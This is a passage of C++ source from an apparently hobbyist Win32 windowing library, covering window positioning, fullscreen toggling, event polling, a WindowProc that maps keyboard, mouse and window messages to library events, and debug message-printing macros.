  s32 screenWidth  = GetSystemMetrics(SM_CXSCREEN);
  s32 screenHeight = GetSystemMetrics(SM_CYSCREEN);


  if(newRect != nullptr){

    RECT winRectTmp;
    GetWindowRect(_opq->winHandle, &winRectTmp); //get window's bounding box
    shape::rect winRectCurrent = ConvertToKitRect(winRectTmp);

    shape::point centerPos;
    centerPos.x = screenWidth /2 - winRectCurrent.w/2;
    centerPos.y = screenHeight/2 - winRectCurrent.h/2;


    if(     newRect->x == WINPOS_UNDEFINED) newRect->x = CW_USEDEFAULT;
    else if(newRect->x == WINPOS_CENTERED ) newRect->x = centerPos.x;
    if(     newRect->y == WINPOS_UNDEFINED) newRect->y = CW_USEDEFAULT;
    else if(newRect->y == WINPOS_CENTERED ) newRect->y = centerPos.y;

    shape::rect _newRect = winRectCurrent;
    if(newRect->x != WINPOS_UNCHANGED) _newRect.x = newRect->x;
    if(newRect->y != WINPOS_UNCHANGED) _newRect.y = newRect->y;
    if(newRect->w!=WINPOS_UNCHANGED && newRect->w>0) _newRect.w = newRect->w;
    if(newRect->h!=WINPOS_UNCHANGED && newRect->h>0) _newRect.h = newRect->h;


    SetWindowPos(_opq->winHandle, nullptr, newRect->x,newRect->y,
                 newRect->w, newRect->h, SWP_NOZORDER);

    GetWindowRect(_opq->winHandle, &winRectTmp); //get window's bounding box (again)
    _opq->winRect = ConvertToKitRect(winRectTmp); //update the window's rect


  } else {
    //winRect automatically gets overwritten for every WM_MOVE and WM_SIZE message,
     //so record its previous value so it can be set back after the SetWindowPos
    shape::rect previousRectValue = _opq->winRect;

    //this will fill the entire screen
    SetWindowPos(_opq->winHandle, nullptr, 0,0,
                 screenWidth, screenHeight, SWP_NOZORDER);

    _opq->winRect = previousRectValue;


  }
}



void Window::setVisibility(bool showWindow){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  ShowWindow(_opq->winHandle, (showWindow) ? SW_SHOW : SW_HIDE);
  _opq->winShown = showWindow;
  //*maybe* set _opq->winFlags (probably not needed, though)
}



void Window::setFocus(bool enable){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  SetFocus((enable) ? _opq->winHandle : nullptr);
  _opq->winFocus = enable;
}



void Window::setFullscreen(bool enable){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;


  if(enable){ //modify values accordingly
    //style flags
    SetWindowLongA(_opq->winHandle, GWL_STYLE,
                   _opq->winFlags & ~(WS_CAPTION | WS_THICKFRAME));

    //extended style flags
    SetWindowLong(_opq->winHandle, GWL_EXSTYLE,
                  _opq->winFlagsEx & ~(WS_EX_DLGMODALFRAME |
                  WS_EX_WINDOWEDGE | WS_EX_CLIENTEDGE | WS_EX_STATICEDGE));

    //stretch window to match screen's width and height
    setWindowRect(nullptr);


  } else { //restore values to what they were before
    //restore style flags
    SetWindowLongA(_opq->winHandle, GWL_STYLE, _opq->winFlags);

    //restore extended style flags
    SetWindowLong(_opq->winHandle, GWL_EXSTYLE, _opq->winFlagsEx);

    //restore window position and size
    setWindowRect(&_opq->winRect);


  }

  //idk for sure why this fixes the issue of the window breaking when
   //fullscreen is toggled, but if it works in the constructor and here too,
   //then i have no problem with doing it this way :)
  setVisibility(_opq->winShown);
}




bool Window::pollEvent(WindowEvent* event_p){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;

  //take one event off the current event queue and set it to *event_p
  EnterCriticalSection(&_opq->lock);
  WindowEvent event = RemoveFromEventQueue(_opq);
  LeaveCriticalSection(&_opq->lock);


  //if previous event queue is now empty, process any pending window messages,
   //while adding any events generated by WindowProc to the event queue
  if(_opq->eventQueueNext == _opq->eventQueueEnd){
    MSG message;
    while(PeekMessageA(&message, _opq->winHandle, 0, 0, PM_REMOVE)){
      TranslateMessage(&message);
      DispatchMessageA(&message);
    }
  }


  if(event_p != nullptr) *event_p = event;
  return event.type != WINEVENT_NULL;
}




void Window::lock(bool locked){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  if(locked) EnterCriticalSection(&_opq->lock);
  else       LeaveCriticalSection(&_opq->lock);
}



void Window::present(){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  InvalidateRect(_opq->winHandle, nullptr, false);
  UpdateWindow(_opq->winHandle);
}




void Window::clear(color::ARGB color){
  if(KIT_IS_INVALID_WINDOW) throw KIT_INVALID_WINDOW;
  HBRUSH brushHandle = CreateSolidBrush(color.v);
  if(brushHandle != nullptr){
    SelectObject(_opq->canvas.devCtx, brushHandle);
    RECT rectF;
    rectF.left   = 0;
    rectF.top    = 0;
    rectF.right  = _opq->canvas.size.x;
    rectF.bottom = _opq->canvas.size.y;
    FillRect(_opq->canvas.devCtx, &rectF, brushHandle);
    DeleteObject(brushHandle);
  }
}




}; /* namespace kit */

/*-src\kit_win32\kit_Window.cpp-*/


/*+src\kit_win32\kit_Window_WindowProc.cpp+*/

#include <kit/_video_Window.hpp>
#include <kit/_video_WindowEvent.hpp>
#include ""kit_Window_shared.hpp""
#include ""kit_Window_WindowProcEvent.hpp""


using namespace kit;




#if defined(_DEBUG)
static void printMessage(HWND, UINT, WPARAM, LPARAM);
#else
#define printMessage(...) ;
#endif /* _DEBUG */

LRESULT CALLBACK w32::WindowProc(HWND winHandle, UINT message,
                                 WPARAM wParam, LPARAM lParam)
{
  //printMessage(winHandle, message, wParam, lParam); //debug thingy
  Window* window = (Window*)GetWindowLongPtrA(winHandle, GWLP_USERDATA);

  if(window == nullptr){
    if(message == WM_CREATE){
      //set userdata to a pointer to the associated kit::Window
      CREATESTRUCT* cs = (CREATESTRUCT*)lParam;
      SetWindowLongPtrA(winHandle, GWLP_USERDATA, (LONG_PTR)cs->lpCreateParams);
      return 0;
    }
    goto _dwp; //lol
  } else if(!window->isValid() && !window->isConstructing()){
    _dwp: return DefWindowProcA(winHandle, message, wParam, lParam);
  }



  _WindowOpaque* opq = window->_accessOpaque();
  EnterCriticalSection(&opq->lock);
  LRESULT returnResult = 0;

  WindowEvent event; //will be populated by any call to KIT_HANDLE_EVENT()...
  memset(&event, 0, sizeof(WindowEvent));
  event.common.type     = WINEVENT_COMMON; //...otherwise it will stay common
  event.common.winIndex = opq->winIndex;

  bool switchBool  = false; //multipurpose
  bool switchBool2 = true;   //^^
  u32  switchFlags = 0;      //^^


  switch(message){
    //window and canvas messages (WINEVENT_WIN_<event name>)

    //WINEVENT_WIN_CLOSE
    case WM_CLOSE:
    {
      KIT_HANDLE_EVENT(WIN_CLOSE);

    } break;


    //WINEVENT_WIN_MOVED
    case WM_MOVE:
    {
      //window moved; adjust its position accordingly
      opq->winRect.x = GET_X_LPARAM(lParam);
      opq->winRect.y = GET_Y_LPARAM(lParam);

      KIT_HANDLE_EVENT(WIN_MOVED, opq->winRect);

    } break;


    //WINEVENT_WIN_RESIZED
    case WM_SIZE:
    {
      //window resized; adjust its size accordingly
      opq->winRect.w = LOWORD(lParam);
      opq->winRect.h = HIWORD(lParam);

      //resize canvas if it's supposed to scale with the window
      if(!opq->canvasStretch)
        ResizeBitmapOpaque(opq->canvas, opq->winRect.w, opq->winRect.h);

      //blit canvas to the window to reflect its new size
      window->present();

      KIT_HANDLE_EVENT(WIN_RESIZED, opq->winRect);

    } break;


    //WINEVENT_WIN_UNFOCUSING
    case WM_KILLFOCUS:
    {
      //if a key is released outside the client area, its key up message
       //is never sent, so here the key states are reset when unfocusing...
       //...but first, send a key up event for every currently pressed key

      //call QPC only once, since the events technically happen at the same time
      QueryPerformanceCounter((LARGE_INTEGER*)&event.key.timestamp);

      using namespace WindowProcEvent;
      KEY_Params params = 0;
      params.currUnpressed = 1;

      for(u32 chr=0; chr<256; ++chr){
        //send a KEY_UP only if the state was previously true
        if(opq->keyStates[chr] == true){
          params.scanCode = MapVirtualKeyA(chr, MAPVK_VK_TO_VSC);
          KIT_HANDLE_EVENT(KEY_CHARUPDOWN, false, chr, params, 0);
          if(!AddToEventQueue(opq,event)){ _printf(""event queue is full!!!\n""); }
        }
      }

      memset(opq->keyStates, 0, sizeof(bool)*256); //NOW the states can be reset
      opq->kmod.all = 0; //reset any key modifiers too

      opq->winFocus = false;

      KIT_HANDLE_EVENT(WIN_UNFOCUSING);

    } break;


    //WINEVENT_WIN_FOCUSED
    case WM_SETFOCUS:
    {
      opq->winFocus = true;

      KIT_HANDLE_EVENT(WIN_FOCUSED);

    } break;


    //(no associated event)
    case WM_DESTROY:
    {
      opq->winClosed = true;

    } break;


    //(no associated event)
    case WM_GETMINMAXINFO:
    {
      //enforce minimum window size if canvas does not scale with the window
      if(opq->canvasStretch){
        u32 winStyleCurrent   = GetWindowLongA(winHandle, GWL_STYLE  );
        u32 winStyleExCurrent = GetWindowLongA(winHandle, GWL_EXSTYLE);
        shape::point winSizeAdjusted = CalculateWindowSize(opq->canvas.size.x,
                                                           opq->canvas.size.y,
                                                           winStyleCurrent,
                                                           winStyleExCurrent);

        MINMAXINFO* mmi = (MINMAXINFO*)lParam;
        mmi->ptMinTrackSize.x = winSizeAdjusted.x;
        mmi->ptMinTrackSize.y = winSizeAdjusted.y;
      }

    } break;


    //(no associated event)
    case WM_PAINT:
    {
      if(opq->canvas.handle == nullptr) break; //just in case
      PAINTSTRUCT paint;
      HDC         winDevCtx; //window device context
      RECT        rectO; //[O]riginal
      shape::rect rectW; //[W]indow
      shape::rect rectF; //[F]rame

      //prepare window for painting
      winDevCtx = BeginPaint(winHandle, &paint);
      rectO = paint.rcPaint;
      rectW = ConvertToKitRect(rectO);

      //calculate copy region of canvas
      f64 percentageX = (f64)rectW.x/rectW.w; //from 0.0 -> 1.0
      f64 percentageY = (f64)rectW.y/rectW.h; //from 0.0 -> 1.0
      rectF.w = opq->canvas.size.x;
      rectF.h = opq->canvas.size.y;
      rectF.x = (s32)( (f64)rectF.w*percentageX + 0.5 ); //(+0.5 for rounding)
      rectF.y = (s32)( (f64)rectF.y*percentageY + 0.5 );

      //copy canvas bitmap to window
       //(window and canvas stretch modes should be the same)
      SetStretchBltMode(winDevCtx, opq->canvas.stretchMode);
      StretchBlt(winDevCtx, rectW.x,rectW.y, rectW.w,rectW.h,
                 opq->canvas.devCtx, rectF.x,rectF.y, rectF.w,rectF.h, SRCCOPY);

      EndPaint(winHandle, &paint);

    } break;



    //keyboard messages (WINEVENT_KEY_<event name>)

    //WINEVENT_KEY_CHAR, WINEVENT_KEY_UP, WINEVENT_KEY_DOWN
    case WM_CHAR:
    case WM_SYSKEYUP:
    case WM_SYSKEYDOWN:
    case WM_KEYUP:
    case WM_KEYDOWN:
    case WM_SYSCHAR:
    {
#define printKeyParams() {                                                        \
  _printf(""{\n"");                                                                 \
  _printf(""  charEvent      = %s\n"", (charEvent) ? ""true"" : ""false"");             \
  _printf(""  virtualKeyCode = %c (0x%02X)\n"", virtualKeyCode, virtualKeyCode);    \
  _printf(""  repeatCount    = %u\n"", params.repeatCount);                         \
  _printf(""  scanCode       = %c (0x%02X)\n"", params.scanCode,params.scanCode);   \
  _printf(""  extendedKey    = %s\n"", (params.extendedKey) ? ""true"" : ""false"");    \
  _printf(""  altKeyDown     = %s\n"", (params.altKeyDown) ? ""true"" : ""false"");     \
  _printf(""  prevPressed    = %s\n"", (!params.prevUnpressed) ? ""true"" : ""false""); \
  _printf(""  currPressed    = %s\n"", (!params.currUnpressed) ? ""true"" : ""false""); \
  _printf(""}\n""); }
      //^^ i'll remove this stuff once i figure out how to handle key modifiers

      using namespace WindowProcEvent;

      //marshal relevant stuff to pass to event handler
      bool    charEvent = message==WM_CHAR;
      u8 virtualKeyCode = (u8)wParam;
      KEY_Params params = (u32)lParam;

      //set repeat flag
      params.repeatCount = (!params.currUnpressed)        == true &&
                           opq->keyStates[virtualKeyCode] == true;

      if(!charEvent) opq->keyStates[virtualKeyCode] = !params.currUnpressed;

      //update any relevant key modifiers
      opq->kmod.all = 0; //tbd

      KIT_HANDLE_EVENT(KEY_CHARUPDOWN, charEvent, virtualKeyCode,
                                       params,    opq->kmod.all);

    } break;



    //mouse messages (WINEVENT_MOUSE_<event name>)

    //WINEVENT_MOUSE_MOVE
    case WM_MOUSEMOVE:
    {
      using namespace WindowProcEvent;

      //get button states
      MOUSE_ButtonStates buttonStates;
      buttonStates.left   = (wParam&MK_LBUTTON ) != 0;
      buttonStates.middle = (wParam&MK_MBUTTON ) != 0;
      buttonStates.right  = (wParam&MK_RBUTTON ) != 0;
      buttonStates.x1     = (wParam&MK_XBUTTON1) != 0;
      buttonStates.x2     = (wParam&MK_XBUTTON2) != 0;

      //get new mouse position
      shape::point mousePositionNew;
      mousePositionNew.x = GET_X_LPARAM(lParam);
      mousePositionNew.y = GET_Y_LPARAM(lParam);

      //if this is the first instance of WINEVENT_MOUSE_MOVE,
       //there is no previous mouse position, so the delta should be 0 then
      if(!opq->mouseWasMovedBefore){
        //(handle MOUSE_ENTER events here too, since
         //there is no special message for it)
        KIT_HANDLE_EVENT(MOUSE_ENTER);
        QueryPerformanceCounter((LARGE_INTEGER*)&event.common.timestamp);
        if(!AddToEventQueue(opq,event)){ _printf(""event queue is full!!!\n""); }
        opq->mousePosition = mousePositionNew,
        opq->mouseWasMovedBefore = true;
      }

      KIT_HANDLE_EVENT(MOUSE_MOVE, buttonStates.value,
                       opq->mousePosition, mousePositionNew);

      opq->mousePosition = mousePositionNew; //set current position to new one

    } break;


    //WINEVENT_MOUSE_LEAVE
    case WM_MOUSELEAVE:
    {
      //indicates that the mouse will have yet to be moved inside client area
      opq->mouseWasMovedBefore = false;

      KIT_HANDLE_EVENT(MOUSE_LEAVE);

    } break;


    /*WINEVENT_MOUSE_ENTER (is handled inside WM_MOUSEMOVE)
    case WM_<there is no mouse enter message!>:
    {
      KIT_HANDLE_EVENT(MOUSE_ENTER);

    } break; */


    //WINEVENT_MOUSE_UP, WINEVENT_MOUSE_DOWN
     //switchBool  = event.mouse.dblClick
     //switchBool2 = event.mouse.pressed
     //switchFlags = event.mouse.button
    case WM_LBUTTONDBLCLK: switchBool  = true;  goto _notLButtonUp;
    case WM_LBUTTONUP    : switchBool2 = false; _notLButtonUp:
    case WM_LBUTTONDOWN  : switchFlags |= MBUTTON_LEFT; goto _handleMouseClick;

    case WM_MBUTTONDBLCLK: switchBool  = true;  goto _notMButtonUp;
    case WM_MBUTTONUP    : switchBool2 = false; _notMButtonUp:
    case WM_MBUTTONDOWN  : switchFlags |= MBUTTON_MIDDLE; goto _handleMouseClick;

    case WM_RBUTTONDBLCLK: switchBool  = true;  goto _notRButtonUp;
    case WM_RBUTTONUP    : switchBool2 = false; _notRButtonUp:
    case WM_RBUTTONDOWN  : switchFlags |= MBUTTON_RIGHT; goto _handleMouseClick;

    case WM_XBUTTONDBLCLK: switchBool  = true;  goto _notXButtonUp;
    case WM_XBUTTONUP    : switchBool2 = false; _notXButtonUp:
    case WM_XBUTTONDOWN  : if(wParam & MK_XBUTTON1) switchFlags |= MBUTTON_X1;
                           else                     switchFlags |= MBUTTON_X2;
    {
      _handleMouseClick:

      shape::point clickPosition;
      clickPosition.x = GET_X_LPARAM(lParam);
      clickPosition.y = GET_Y_LPARAM(lParam);

      u8   buttonStates = (u8)switchFlags;
      bool pressed      = switchBool2;
      bool doubleClick  = switchBool;

      KIT_HANDLE_EVENT(MOUSE_UPDOWN, clickPosition,
                       buttonStates, pressed, doubleClick);

    } break;


    //WINEVENT_MOUSE_HWHEEL, WINEVENT_MOUSE_VWHEEL
    case WM_MOUSEHWHEEL:
    case WM_MOUSEWHEEL:
    {
      using namespace WindowProcEvent;

      bool verticalScroll = message==WM_MOUSEWHEEL;

      s16  scrollAmount = (s16)HIWORD(wParam);

      MOUSE_ButtonStates buttonStates;
      buttonStates.left   = (wParam&MK_LBUTTON ) != 0;
      buttonStates.middle = (wParam&MK_MBUTTON ) != 0;
      buttonStates.right  = (wParam&MK_RBUTTON ) != 0;
      buttonStates.x1     = (wParam&MK_XBUTTON1) != 0;
      buttonStates.x2     = (wParam&MK_XBUTTON2) != 0;

      shape::point scrollMousePosition;
      scrollMousePosition.x = GET_X_LPARAM(lParam);
      scrollMousePosition.y = GET_Y_LPARAM(lParam);
      //the coordinates are relative to the screen, not the window (for some reason)
      ScreenToClient(winHandle, (POINT*)&scrollMousePosition);

      KIT_HANDLE_EVENT(MOUSE_HVWHEEL, verticalScroll, scrollAmount,
                       buttonStates.value, scrollMousePosition);

    } break;



    default: returnResult = DefWindowProcA(winHandle, message, wParam, lParam);
  }


  if(event.type != WINEVENT_COMMON){
    //idk how expensive QPC is, so i'll only call it if the event is valid
    QueryPerformanceCounter((LARGE_INTEGER*)&event.common.timestamp);
    //i pray AddToEventQueue never fails ever
    if(!AddToEventQueue(opq,event)){ _printf(""event queue is full!!!\n""); }
  }


  LeaveCriticalSection(&opq->lock);
  return returnResult;
}








//these are for enabling and disabling what messages are printed
 //simply comment these out to disable them

#define KIT_PM_WM_NULL                           //0x0000
#define KIT_PM_WM_CREATE                         //0x0001
#define KIT_PM_WM_DESTROY                        //0x0002
#define KIT_PM_WM_MOVE                           //0x0003
#define KIT_PM_WM_SIZE                           //0x0005
#define KIT_PM_WM_ACTIVATE                       //0x0006
#define KIT_PM_WM_SETFOCUS                       //0x0007
#define KIT_PM_WM_KILLFOCUS                      //0x0008
#define KIT_PM_WM_ENABLE                         //0x000A
#define KIT_PM_WM_SETREDRAW                      //0x000B
#define KIT_PM_WM_SETTEXT                        //0x000C
//#define KIT_PM_WM_GETTEXT                        //0x000D
//#define KIT_PM_WM_GETTEXTLENGTH                  //0x000E
#define KIT_PM_WM_PAINT                          //0x000F
#define KIT_PM_WM_CLOSE                          //0x0010
#define KIT_PM_WM_QUERYENDSESSION                //0x0011
#define KIT_PM_WM_QUIT                           //0x0012
#define KIT_PM_WM_QUERYOPEN                      //0x0013
#define KIT_PM_WM_ERASEBKGND                     //0x0014
#define KIT_PM_WM_SYSCOLORCHANGE                 //0x0015
#define KIT_PM_WM_ENDSESSION                     //0x0016
#define KIT_PM_WM_SHOWWINDOW                     //0x0018
#define KIT_PM_WM_SETTINGCHANGE                  //0x001A
#define KIT_PM_WM_DEVMODECHANGE                  //0x001B
#define KIT_PM_WM_ACTIVATEAPP                    //0x001C
#define KIT_PM_WM_FONTCHANGE                     //0x001D
#define KIT_PM_WM_TIMECHANGE                     //0x001E
#define KIT_PM_WM_CANCELMODE                     //0x001F
//#define KIT_PM_WM_SETCURSOR                      //0x0020
#define KIT_PM_WM_MOUSEACTIVATE                  //0x0021
#define KIT_PM_WM_CHILDACTIVATE                  //0x0022
#define KIT_PM_WM_QUEUESYNC                      //0x0023
#define KIT_PM_WM_GETMINMAXINFO                  //0x0024
#define KIT_PM_WM_PAINTICON                      //0x0026
#define KIT_PM_WM_ICONERASEBKGND                 //0x0027
#define KIT_PM_WM_NEXTDLGCTL                     //0x0028
#define KIT_PM_WM_SPOOLERSTATUS                  //0x002A
#define KIT_PM_WM_DRAWITEM                       //0x002B
#define KIT_PM_WM_MEASUREITEM                    //0x002C
#define KIT_PM_WM_DELETEITEM                     //0x002D
#define KIT_PM_WM_VKEYTOITEM                     //0x002E
#define KIT_PM_WM_CHARTOITEM                     //0x002F
#define KIT_PM_WM_SETFONT                        //0x0030
#define KIT_PM_WM_GETFONT                        //0x0031
#define KIT_PM_WM_SETHOTKEY                      //0x0032
#define KIT_PM_WM_GETHOTKEY                      //0x0033
#define KIT_PM_WM_QUERYDRAGICON                  //0x0037
#define KIT_PM_WM_COMPAREITEM                    //0x0039
#define KIT_PM_WM_GETOBJECT                      //0x003D
#define KIT_PM_WM_COMPACTING                     //0x0041
#define KIT_PM_WM_COMMNOTIFY                     //0x0044
#define KIT_PM_WM_WINDOWPOSCHANGING              //0x0046
#define KIT_PM_WM_WINDOWPOSCHANGED               //0x0047
#define KIT_PM_WM_POWER                          //0x0048
#define KIT_PM_WM_COPYDATA                       //0x004A
#define KIT_PM_WM_CANCELJOURNAL                  //0x004B
#define KIT_PM_WM_NOTIFY                         //0x004E
#define KIT_PM_WM_INPUTLANGCHANGEREQUEST         //0x0050
#define KIT_PM_WM_INPUTLANGCHANGE                //0x0051
#define KIT_PM_WM_TCARD                          //0x0052
#define KIT_PM_WM_HELP                           //0x0053
#define KIT_PM_WM_USERCHANGED                    //0x0054
#define KIT_PM_WM_NOTIFYFORMAT                   //0x0055
#define KIT_PM_WM_CONTEXTMENU                    //0x007B
#define KIT_PM_WM_STYLECHANGING                  //0x007C
#define KIT_PM_WM_STYLECHANGED                   //0x007D
#define KIT_PM_WM_DISPLAYCHANGE                  //0x007E
#define KIT_PM_WM_GETICON                        //0x007F
#define KIT_PM_WM_SETICON                        //0x0080
#define KIT_PM_WM_NCCREATE                       //0x0081
#define KIT_PM_WM_NCDESTROY                      //0x0082
#define KIT_PM_WM_NCCALCSIZE                     //0x0083
//#define KIT_PM_WM_NCHITTEST                      //0x0084
#define KIT_PM_WM_NCPAINT                        //0x0085
#define KIT_PM_WM_NCACTIVATE                     //0x0086
#define KIT_PM_WM_GETDLGCODE                     //0x0087
#define KIT_PM_WM_SYNCPAINT                      //0x0088

//#define KIT_PM_WM_NCMOUSEMOVE                    //0x00A0
#define KIT_PM_WM_NCLBUTTONDOWN                  //0x00A1
#define KIT_PM_WM_NCLBUTTONUP                    //0x00A2
#define KIT_PM_WM_NCLBUTTONDBLCLK                //0x00A3
#define KIT_PM_WM_NCRBUTTONDOWN                  //0x00A4
#define KIT_PM_WM_NCRBUTTONUP                    //0x00A5
#define KIT_PM_WM_NCRBUTTONDBLCLK                //0x00A6
#define KIT_PM_WM_NCMBUTTONDOWN                  //0x00A7
#define KIT_PM_WM_NCMBUTTONUP                    //0x00A8
#define KIT_PM_WM_NCMBUTTONDBLCLK                //0x00A9
#define KIT_PM_WM_NCXBUTTONDOWN                  //0x00AB
#define KIT_PM_WM_NCXBUTTONUP                    //0x00AC
#define KIT_PM_WM_NCXBUTTONDBLCLK                //0x00AD

#define KIT_PM_WM_INPUT_DEVICE_CHANGE            //0x00FE
#define KIT_PM_WM_INPUT                          //0x00FF
#define KIT_PM_WM_KEYDOWN                        //0x0100
#define KIT_PM_WM_KEYUP                          //0x0101
#define KIT_PM_WM_CHAR                           //0x0102
#define KIT_PM_WM_DEADCHAR                       //0x0103
#define KIT_PM_WM_SYSKEYDOWN                     //0x0104
#define KIT_PM_WM_SYSKEYUP                       //0x0105
#define KIT_PM_WM_SYSCHAR                        //0x0106
#define KIT_PM_WM_SYSDEADCHAR                    //0x0107
#define KIT_PM_WM_UNICHAR                        //0x0109
#define KIT_PM_WM_IME_STARTCOMPOSITION           //0x010D
#define KIT_PM_WM_IME_ENDCOMPOSITION             //0x010E
#define KIT_PM_WM_IME_COMPOSITION                //0x010F
#define KIT_PM_WM_INITDIALOG                     //0x0110
#define KIT_PM_WM_COMMAND                        //0x0111
#define KIT_PM_WM_SYSCOMMAND                     //0x0112
#define KIT_PM_WM_TIMER                          //0x0113
#define KIT_PM_WM_HSCROLL                        //0x0114
#define KIT_PM_WM_VSCROLL                        //0x0115
#define KIT_PM_WM_INITMENU                       //0x0116
#define KIT_PM_WM_INITMENUPOPUP                  //0x0117
#define KIT_PM_WM_GESTURE                        //0x0119
#define KIT_PM_WM_GESTURENOTIFY                  //0x011A
#define KIT_PM_WM_MENUSELECT                     //0x011F
#define KIT_PM_WM_MENUCHAR                       //0x0120
#define KIT_PM_WM_ENTERIDLE                      //0x0121
#define KIT_PM_WM_MENURBUTTONUP                  //0x0122
#define KIT_PM_WM_MENUDRAG                       //0x0123
#define KIT_PM_WM_MENUGETOBJECT                  //0x0124
#define KIT_PM_WM_UNINITMENUPOPUP                //0x0125
#define KIT_PM_WM_MENUCOMMAND                    //0x0126
#define KIT_PM_WM_CHANGEUISTATE                  //0x0127
#define KIT_PM_WM_UPDATEUISTATE                  //0x0128
#define KIT_PM_WM_QUERYUISTATE                   //0x0129
#define KIT_PM_WM_CTLCOLORMSGBOX                 //0x0132
#define KIT_PM_WM_CTLCOLOREDIT                   //0x0133
#define KIT_PM_WM_CTLCOLORLISTBOX                //0x0134
#define KIT_PM_WM_CTLCOLORBTN                    //0x0135
#define KIT_PM_WM_CTLCOLORDLG                    //0x0136
#define KIT_PM_WM_CTLCOLORSCROLLBAR              //0x0137
#define KIT_PM_WM_CTLCOLORSTATIC                 //0x0138
#define KIT_PM_MN_GETHMENU                       //0x01E1

//#define KIT_PM_WM_MOUSEMOVE                      //0x0200
#define KIT_PM_WM_LBUTTONDOWN                    //0x0201
#define KIT_PM_WM_LBUTTONUP                      //0x0202
#define KIT_PM_WM_LBUTTONDBLCLK                  //0x0203
#define KIT_PM_WM_RBUTTONDOWN                    //0x0204
#define KIT_PM_WM_RBUTTONUP                      //0x0205
#define KIT_PM_WM_RBUTTONDBLCLK                  //0x0206
#define KIT_PM_WM_MBUTTONDOWN                    //0x0207
#define KIT_PM_WM_MBUTTONUP                      //0x0208
#define KIT_PM_WM_MBUTTONDBLCLK                  //0x0209
#define KIT_PM_WM_MOUSEWHEEL                     //0x020A
#define KIT_PM_WM_XBUTTONDOWN                    //0x020B
#define KIT_PM_WM_XBUTTONUP                      //0x020C
#define KIT_PM_WM_XBUTTONDBLCLK                  //0x020D

#define KIT_PM_WM_PARENTNOTIFY                   //0x0210
#define KIT_PM_WM_ENTERMENULOOP                  //0x0211
#define KIT_PM_WM_EXITMENULOOP                   //0x0212
#define KIT_PM_WM_NEXTMENU                       //0x0213
#define KIT_PM_WM_SIZING                         //0x0214
#define KIT_PM_WM_CAPTURECHANGED                 //0x0215
#define KIT_PM_WM_MOVING                         //0x0216
#define KIT_PM_WM_POWERBROADCAST                 //0x0218
#define KIT_PM_WM_DEVICECHANGE                   //0x0219
#define KIT_PM_WM_MDICREATE                      //0x0220
#define KIT_PM_WM_MDIDESTROY                     //0x0221
#define KIT_PM_WM_MDIACTIVATE                    //0x0222
#define KIT_PM_WM_MDIRESTORE                     //0x0223
#define KIT_PM_WM_MDINEXT                        //0x0224
#define KIT_PM_WM_MDIMAXIMIZE                    //0x0225
#define KIT_PM_WM_MDITILE                        //0x0226
#define KIT_PM_WM_MDICASCADE                     //0x0227
#define KIT_PM_WM_MDIICONARRANGE                 //0x0228
#define KIT_PM_WM_MDIGETACTIVE                   //0x0229
#define KIT_PM_WM_MDISETMENU                     //0x0230
#define KIT_PM_WM_ENTERSIZEMOVE                  //0x0231
#define KIT_PM_WM_EXITSIZEMOVE                   //0x0232
#define KIT_PM_WM_DROPFILES                      //0x0233
#define KIT_PM_WM_MDIREFRESHMENU                 //0x0234
#define KIT_PM_WM_POINTERDEVICECHANGE            //0x0238
#define KIT_PM_WM_POINTERDEVICEINRANGE           //0x0239
#define KIT_PM_WM_POINTERDEVICEOUTOFRANGE        //0x023A
#define KIT_PM_WM_TOUCH                          //0x0240
#define KIT_PM_WM_NCPOINTERUPDATE                //0x0241
#define KIT_PM_WM_NCPOINTERDOWN                  //0x0242
#define KIT_PM_WM_NCPOINTERUP                    //0x0243
#define KIT_PM_WM_POINTERUPDATE                  //0x0245
#define KIT_PM_WM_POINTERDOWN                    //0x0246
#define KIT_PM_WM_POINTERUP                      //0x0247
#define KIT_PM_WM_POINTERENTER                   //0x0249
#define KIT_PM_WM_POINTERLEAVE                   //0x024A
#define KIT_PM_WM_POINTERACTIVATE                //0x024B
#define KIT_PM_WM_POINTERCAPTURECHANGED          //0x024C
#define KIT_PM_WM_TOUCHHITTESTING                //0x024D
#define KIT_PM_WM_POINTERWHEEL                   //0x024E
#define KIT_PM_WM_POINTERHWHEEL                  //0x024F
#define KIT_PM_DM_POINTERHITTEST                 //0x0250
#define KIT_PM_WM_POINTERROUTEDTO                //0x0251
#define KIT_PM_WM_POINTERROUTEDAWAY              //0x0252
#define KIT_PM_WM_POINTERROUTEDRELEASED          //0x0253
#define KIT_PM_WM_IME_SETCONTEXT                 //0x0281
#define KIT_PM_WM_IME_NOTIFY                     //0x0282
#define KIT_PM_WM_IME_CONTROL                    //0x0283
#define KIT_PM_WM_IME_COMPOSITIONFULL            //0x0284
#define KIT_PM_WM_IME_SELECT                     //0x0285
#define KIT_PM_WM_IME_CHAR                       //0x0286
#define KIT_PM_WM_IME_REQUEST                    //0x0288
#define KIT_PM_WM_IME_KEYDOWN                    //0x0290
#define KIT_PM_WM_IME_KEYUP                      //0x0291
#define KIT_PM_WM_MOUSEHOVER                     //0x02A1
#define KIT_PM_WM_MOUSELEAVE                     //0x02A3
#define KIT_PM_WM_NCMOUSEHOVER                   //0x02A0
#define KIT_PM_WM_NCMOUSELEAVE                   //0x02A2
#define KIT_PM_WM_WTSSESSION_CHANGE              //0x02B1
#define KIT_PM_WM_DPICHANGED                     //0x02E0
#define KIT_PM_WM_DPICHANGED_BEFOREPARENT        //0x02E2
#define KIT_PM_WM_DPICHANGED_AFTERPARENT         //0x02E3
#define KIT_PM_WM_GETDPISCALEDSIZE               //0x02E4
#define KIT_PM_WM_CUT                            //0x0300
#define KIT_PM_WM_COPY                           //0x0301
#define KIT_PM_WM_PASTE                          //0x0302
#define KIT_PM_WM_CLEAR                          //0x0303
#define KIT_PM_WM_UNDO                           //0x0304
#define KIT_PM_WM_RENDERFORMAT                   //0x0305
#define KIT_PM_WM_RENDERALLFORMATS               //0x0306
#define KIT_PM_WM_DESTROYCLIPBOARD               //0x0307
#define KIT_PM_WM_DRAWCLIPBOARD                  //0x0308
#define KIT_PM_WM_PAINTCLIPBOARD                 //0x0309
#define KIT_PM_WM_VSCROLLCLIPBOARD               //0x030A
#define KIT_PM_WM_SIZECLIPBOARD                  //0x030B
#define KIT_PM_WM_ASKCBFORMATNAME                //0x030C
#define KIT_PM_WM_CHANGECBCHAIN                  //0x030D
